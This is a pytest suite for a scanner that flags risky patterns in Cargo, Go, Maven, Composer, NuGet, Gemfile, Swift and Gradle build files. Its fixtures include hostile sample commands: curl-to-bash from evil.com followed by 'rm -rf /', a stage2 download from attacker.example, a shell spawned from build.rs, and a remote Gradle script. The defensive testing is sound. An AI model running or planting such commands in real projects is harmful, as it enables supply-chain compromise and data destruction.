"""Tests for ``scripts/lib/per_language_patterns.py``.

Wave 16 impl-k — verifies 8 per-language ecosystem rules each have
a positive + (1–2) negative tests. Pure-stdlib pytest.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

# Make ``scripts/lib`` importable without packaging — same trick
# used by the other test_*_patterns.py files in this repo.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts" / "lib"))

import per_language_patterns as plp  # noqa: E402

# ---- Module-level invariants -------------------------------------------


def test_rules_have_unique_ids() -> None:
    """Every Rule.id is unique — duplicates would dedupe-collide."""
    ids = [r.id for r in plp.RULES]
    assert len(ids) == len(set(ids)), f"duplicate rule ids: {ids}"


def test_rules_have_compiled_patterns() -> None:
    """Every Rule.pattern is a compiled regex with IGNORECASE+MULTILINE."""
    import re
    for rule in plp.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
        assert rule.pattern.flags & re.IGNORECASE, rule.id
        assert rule.pattern.flags & re.MULTILINE, rule.id


def test_rules_have_valid_severity() -> None:
    """Severity is one of the four canonical strings."""
    allowed = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in plp.RULES:
        assert rule.severity in allowed, f"{rule.id}: {rule.severity}"


def test_scan_empty_returns_empty() -> None:
    """Empty input returns empty findings list."""
    assert plp.scan_text("") == []
    assert plp.scan_text("\n\n") == []


def test_rules_count_matches_proposals() -> None:
    """We implemented 8 of the 8 distill2-a proposals."""
    assert len(plp.RULES) == 8


def test_finding_namedtuple_shape() -> None:
    """Finding has the same 7 fields as agent_config_patterns.Finding."""
    f = plp.Finding(
        rule_id="x", line=1, column=1, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-05",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.column == 1


# ---- Rule 1: Cargo build.rs syscalls -----------------------------------


def test_cargo_buildrs_command_shell_positive() -> None:
    """build.rs spawning `sh` is flagged."""
    src = '''
    use std::process::Command;
    fn main() {
        Command::new("sh").arg("-c").arg("curl http://evil.com").status().unwrap();
    }
    '''
    findings = plp.scan_text(src)
    ids = [f.rule_id for f in findings]
    assert "sc-cargo-buildrs-suspicious-syscalls" in ids


def test_cargo_buildrs_tcp_connect_positive() -> None:
    """build.rs opening a TCP socket is flagged."""
    src = '''
    use std::net::TcpStream;
    fn main() {
        let _ = TcpStream::connect("attacker.example:1337");
    }
    '''
    findings = plp.scan_text(src)
    assert any(f.rule_id == "sc-cargo-buildrs-suspicious-syscalls" for f in findings)


def test_cargo_buildrs_legit_cc_negative() -> None:
    """A legitimate `cc::Build::new()` (no syscall pattern) does NOT fire."""
    src = '''
    use cc;
    fn main() {
        cc::Build::new().file("src/foo.c").compile("foo");
    }
    '''
    findings = plp.scan_text(src)
    assert not any(f.rule_id == "sc-cargo-buildrs-suspicious-syscalls" for f in findings)


def test_cargo_buildrs_pkg_config_negative() -> None:
    """Legitimate `pkg_config::Config::new()` does NOT fire."""
    src = '''
    fn main() {
        pkg_config::Config::new().probe("libfoo").unwrap();
    }
    '''
    findings = plp.scan_text(src)
    assert not any(f.rule_id == "sc-cargo-buildrs-suspicious-syscalls" for f in findings)


# ---- Rule 2: Go replace directive --------------------------------------


def test_go_replace_escape_path_positive() -> None:
    """`replace foo => ../../../private/payload` is flagged."""
    go_mod = """
module example.com/x

go 1.22

replace example.com/foo => ../../../private/payload
"""
    findings = plp.scan_text(go_mod)
    assert any(f.rule_id == "sc-go-replace-directive-local-path-hijack" for f in findings)


def test_go_replace_absolute_path_positive() -> None:
    """`replace foo => /absolute/path` is flagged."""
    go_mod = """
replace example.com/foo v1.2.3 => /home/attacker/fork
"""
    findings = plp.scan_text(go_mod)
    assert any(f.rule_id == "sc-go-replace-directive-local-path-hijack" for f in findings)


def test_go_replace_workspace_sibling_negative() -> None:
    """`replace foo => ./sibling` (single-dot, in-repo) does NOT fire."""
    go_mod = """
replace example.com/foo => ./sibling
"""
    findings = plp.scan_text(go_mod)
    assert not any(f.rule_id == "sc-go-replace-directive-local-path-hijack" for f in findings)


def test_go_replace_public_to_public_negative() -> None:
    """`replace foo => github.com/fork/bar` (public→public) does NOT fire."""
    go_mod = """
replace example.com/foo => github.com/fork/bar v1.0.0
"""
    findings = plp.scan_text(go_mod)
    assert not any(f.rule_id == "sc-go-replace-directive-local-path-hijack" for f in findings)


# ---- Rule 3: Maven settings.xml plain password -------------------------


def test_maven_plain_password_positive() -> None:
    """<password>hunter2</password> (literal) is flagged."""
    xml = """
<server>
    <id>nexus</id>
    <username>admin</username>
    <password>hunter2</password>
</server>
"""
    findings = plp.scan_text(xml)
    assert any(f.rule_id == "sc-maven-settings-xml-plain-credentials" for f in findings)


def test_maven_plain_private_key_positive() -> None:
    """<privateKey>/path/to/key</privateKey> (literal) is flagged."""
    xml = """
<server>
    <privateKey>/Users/me/.ssh/id_rsa</privateKey>
</server>
"""
    findings = plp.scan_text(xml)
    assert any(f.rule_id == "sc-maven-settings-xml-plain-credentials" for f in findings)


def test_maven_env_var_password_negative() -> None:
    """<password>${env.NEXUS_PASSWORD}</password> (interpolation) does NOT fire."""
    xml = """
<server>
    <password>${env.NEXUS_PASSWORD}</password>
</server>
"""
    findings = plp.scan_text(xml)
    assert not any(f.rule_id == "sc-maven-settings-xml-plain-credentials" for f in findings)


def test_maven_secrets_interpolation_negative() -> None:
    """<password>${secrets.foo}</password> (secrets store) does NOT fire."""
    xml = """
<server>
    <password>${secrets.maven_central_pw}</password>
</server>
"""
    findings = plp.scan_text(xml)
    assert not any(f.rule_id == "sc-maven-settings-xml-plain-credentials" for f in findings)


# ---- Rule 4: Composer script RCE ---------------------------------------


def test_composer_post_install_shell_meta_positive() -> None:
    """composer.json post-install-cmd with `;` shell-meta is flagged."""
    cj = """
{
    "scripts": {
        "post-install-cmd": "curl http://evil.com/x | bash; rm -rf /"
    }
}
"""
    findings = plp.scan_text(cj)
    assert any(f.rule_id == "sc-composer-script-postinstall-rce" for f in findings)


def test_composer_pre_update_curl_positive() -> None:
    """composer.json pre-update-cmd invoking curl is flagged."""
    cj = """
{
    "scripts": {
        "pre-update-cmd": "curl -s http://attacker.example/stage2 -o /tmp/s"
    }
}
"""
    findings = plp.scan_text(cj)
    assert any(f.rule_id == "sc-composer-script-postinstall-rce" for f in findings)


def test_composer_laravel_artisan_negative() -> None:
    """composer.json post-install-cmd = `@php artisan migrate` does NOT fire."""
    cj = """
{
    "scripts": {
        "post-install-cmd": "@php artisan migrate"
    }
}
"""
    findings = plp.scan_text(cj)
    assert not any(f.rule_id == "sc-composer-script-postinstall-rce" for f in findings)


# ---- Rule 5: NuGet ClearTextPassword ------------------------------------


def test_nuget_cleartext_password_literal_positive() -> None:
    """<add key="ClearTextPassword" value="hunter2"/> is flagged."""
    cfg = """<?xml version="1.0"?>
<configuration>
    <packageSourceCredentials>
        <Nexus>
            <add key="Username" value="admin"/>
            <add key="ClearTextPassword" value="hunter2"/>
        </Nexus>
    </packageSourceCredentials>
</configuration>
"""
    findings = plp.scan_text(cfg)
    assert any(f.rule_id == "sc-nuget-config-cleartext-password" for f in findings)


def test_nuget_cleartext_envvar_negative() -> None:
    """<add key="ClearTextPassword" value="%NUGET_PW%"/> does NOT fire."""
    cfg = """<?xml version="1.0"?>
<configuration>
    <packageSourceCredentials>
        <Nexus>
            <add key="ClearTextPassword" value="%NUGET_PW%"/>
        </Nexus>
    </packageSourceCredentials>
</configuration>
"""
    findings = plp.scan_text(cfg)
    assert not any(f.rule_id == "sc-nuget-config-cleartext-password" for f in findings)


# ---- Rule 6: Ruby Gemfile loose-version + git --------------------------


def test_ruby_gemfile_loose_git_positive() -> None:
    """`gem "foo", ">= 1.0", :git => "..."` is flagged."""
    gf = '''
source "https://rubygems.org"

gem "foo", ">= 1.0", :git => "https://github.com/attacker/foo.git"
'''
    findings = plp.scan_text(gf)
    assert any(f.rule_id == "sc-ruby-gemfile-unpinned-and-git-source" for f in findings)


def test_ruby_gemfile_tilde_arrow_github_positive() -> None:
    """`gem "foo", "~> 2", :github => "..."` is flagged."""
    gf = '''
gem "foo", "~> 2.0", :github => "attacker/foo"
'''
    findings = plp.scan_text(gf)
    assert any(f.rule_id == "sc-ruby-gemfile-unpinned-and-git-source" for f in findings)


def test_ruby_gemfile_pinned_with_git_negative() -> None:
    """`gem "foo", "= 1.2.3", :git => "..."` (exact-pin + git) does NOT fire."""
    gf = '''
gem "foo", "= 1.2.3", :git => "https://github.com/legit/foo.git"
'''
    findings = plp.scan_text(gf)
    assert not any(f.rule_id == "sc-ruby-gemfile-unpinned-and-git-source" for f in findings)


def test_ruby_gemfile_loose_no_git_negative() -> None:
    """`gem "foo", "~> 1"` (loose, no git source) does NOT fire."""
    gf = '''
gem "foo", "~> 1.0"
'''
    findings = plp.scan_text(gf)
    assert not any(f.rule_id == "sc-ruby-gemfile-unpinned-and-git-source" for f in findings)


# ---- Rule 7: Swift binaryTarget missing checksum -----------------------


def test_swift_binarytarget_empty_checksum_positive() -> None:
    """.binaryTarget with empty checksum still MATCHES the call shape."""
    # We match the call; the verifier then inspects the checksum.
    src = '''
        .binaryTarget(
            name: "Foo",
            url: "https://attacker.example/foo.zip",
            checksum: ""
        )
'''
    findings = plp.scan_text(src)
    matches = [f for f in findings if f.rule_id == "sc-swift-binarytarget-missing-checksum"]
    assert matches, "expected match on .binaryTarget call"
    # The matched text contains an empty checksum literal.
    assert 'checksum: ""' in matches[0].matched_text


def test_swift_binarytarget_with_checksum_positive() -> None:
    """.binaryTarget with a real-looking checksum still matches the call.

    Triage layer downstream is responsible for distinguishing
    placeholder from real checksums by length / hex shape — the
    regex catches every .binaryTarget call so the caller can
    inspect the captured groups.
    """
    src = '''
        .binaryTarget(
            name: "Foo",
            url: "https://example.com/foo.zip",
            checksum: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        )
'''
    findings = plp.scan_text(src)
    assert any(f.rule_id == "sc-swift-binarytarget-missing-checksum" for f in findings)


def test_swift_no_binarytarget_negative() -> None:
    """A Package.swift with no .binaryTarget does NOT fire."""
    src = '''
        .package(url: "https://github.com/foo/bar.git", from: "1.0.0"),
        .target(name: "App", dependencies: ["Foo"])
'''
    findings = plp.scan_text(src)
    assert not any(f.rule_id == "sc-swift-binarytarget-missing-checksum" for f in findings)


# ---- Rule 8: Gradle apply-from / flatDir --------------------------------


def test_gradle_apply_from_http_positive() -> None:
    """`apply from: "https://..."` is flagged."""
    bg = '''
apply from: "https://gradle.attacker.example/build.gradle"

dependencies {
    implementation 'org.example:lib:1.0'
}
'''
    findings = plp.scan_text(bg)
    assert any(f.rule_id == "sc-gradle-apply-from-http-or-flatdir" for f in findings)


def test_gradle_flatdir_positive() -> None:
    """`flatDir { dirs '/local' }` is flagged."""
    bg = '''
repositories {
    flatDir {
        dirs 'lib'
    }
}
'''
    findings = plp.scan_text(bg)
    assert any(f.rule_id == "sc-gradle-apply-from-http-or-flatdir" for f in findings)


def test_gradle_no_apply_from_negative() -> None:
    """A build.gradle without apply-from or flatDir does NOT fire."""
    bg = '''
plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.example:lib:1.0'
}
'''
    findings = plp.scan_text(bg)
    assert not any(f.rule_id == "sc-gradle-apply-from-http-or-flatdir" for f in findings)


# ---- Cross-cutting: line/column accuracy --------------------------------


def test_finding_line_column_accuracy() -> None:
    """Reported line/column matches the actual position in the source."""
    src = "line1\nline2\nreplace foo => /attacker/fork\n"
    findings = plp.scan_text(src)
    hijack = [f for f in findings if f.rule_id == "sc-go-replace-directive-local-path-hijack"]
    assert hijack, f"expected hijack finding, got {findings}"
    # The "replace" keyword is at line 3, column 1 (1-based, after two newlines).
    assert hijack[0].line == 3
    assert hijack[0].column == 1


def test_scan_dedupes_same_rule_same_position() -> None:
    """A single line matched by a single rule yields a single finding."""
    src = "replace foo => /attacker/fork\n"
    findings = plp.scan_text(src)
    hijacks = [f for f in findings if f.rule_id == "sc-go-replace-directive-local-path-hijack"]
    # Only one finding from a single match.
    assert len(hijacks) == 1


def test_findings_sorted_by_position() -> None:
    """Findings are sorted by (line, column, rule_id)."""
    src = (
        '<password>plain1</password>\n'
        'replace foo => ../escape\n'
        '<privateKey>/some/key</privateKey>\n'
    )
    findings = plp.scan_text(src)
    lines = [f.line for f in findings]
    assert lines == sorted(lines), f"findings not sorted by line: {lines}"


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
